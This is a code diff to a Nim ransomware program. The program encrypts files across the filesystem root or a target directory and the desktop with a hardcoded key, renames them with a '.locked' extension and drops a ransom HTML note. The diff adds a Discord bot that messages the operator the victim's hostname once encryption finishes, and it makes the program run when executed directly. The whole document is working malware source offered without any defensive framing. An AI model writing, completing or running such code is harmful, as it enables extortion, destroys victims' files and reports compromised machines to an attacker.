@@ -1,4 +1,4 @@
-import os, nimcrypto, strutils
+import os, nimcrypto, strutils, osproc, dimscord, asyncdispatch, options
 
 const defaultHtml = """
 <!DOCTYPE html>
@@ -104,13 +104,46 @@ proc openInDefaultBrowser(filePath: string) =
   except OSError as e:
     echo "Error opening browser: ", e.msg
 
+const
+  discordToken = ""
+  creatorId = ""
+
+proc getHostname(): string =
+  when defined(windows):
+    let (output, exitCode) = execCmdEx("hostname")
+    if exitCode == 0:
+      return output.strip()
+    else:
+      return "unknown_hostname"
+  else:
+    let (output, exitCode) = execCmdEx("hostname")
+    if exitCode == 0:
+      return output.strip()
+    else:
+      return "unknown_hostname"
+
+let machineName = getHostname()
+
+proc sendDiscordMessage(message: string) {.async.} =
+  if discordToken.len == 0 or creatorId.len == 0:
+    echo "Discord token or creator ID is missing. Skipping notification."
+    return
+  
+  let discord = newDiscordClient(discordToken)
+  
+  try:
+    let dm = await discord.api.createUserDm(creatorId)
+    discard await discord.api.sendMessage(dm.id, machineName & ": " & message)
+  except Exception as e:
+    echo "Failed to send Discord message: ", e.msg
+
 proc main() =  
   when defined(decrypt):
     const decryptMode = true
   else:
     const decryptMode = false
   
-  const key = "hellow3n2wnj2nwww21"
+  const key = "0123456789abcdef0123456789abcdef"
   const iv = "abcdef9876543210"
   const extension = ".locked"
   var htmlContent = defaultHtml
@@ -125,28 +158,29 @@ proc main() =
   else:
     root = "/"
 
+  let correctedExtension = if extension.startsWith("."): extension else: "." & extension
 
   if decryptMode:
     echo "Starting decryption..."
     for dir in [root, desktop]:
       for file in walkDirRec(dir):
-        if file.endsWith(extension):
+        if file.endsWith(correctedExtension):
           files.add(file)
     
     echo "Found ", files.len, " files to decrypt."
     for file in files:
-      decryptFile(file, key, iv, extension)
+      decryptFile(file, key, iv, correctedExtension)
     echo "Decryption complete."
   else:
     echo "Starting encryption..."
     for dir in [targetDir, desktop]:
       for file in walkDirRec(dir):
-        if fileExists(file) and not file.endsWith(extension) and not file.contains("ransom.html"):
+        if fileExists(file) and not file.endsWith(correctedExtension) and not file.contains("ransom.html"):
           files.add(file)
     
     echo "Found ", files.len, " files to encrypt."
     for file in files:
-      processFile(file, key, iv, extension)
+      processFile(file, key, iv, correctedExtension)
 
     let ransomFile = joinPath(desktop, "ransom.html")
     try:
@@ -155,6 +189,10 @@ proc main() =
       echo "Ransom note created at ", ransomFile
     except OSError as e:
       echo "Error creating or opening ransom note: ", e.msg
+    waitFor sendDiscordMessage("Encryption complete")
 
 when not isMainModule:
   discard
+
+when isMainModule:
+  main()
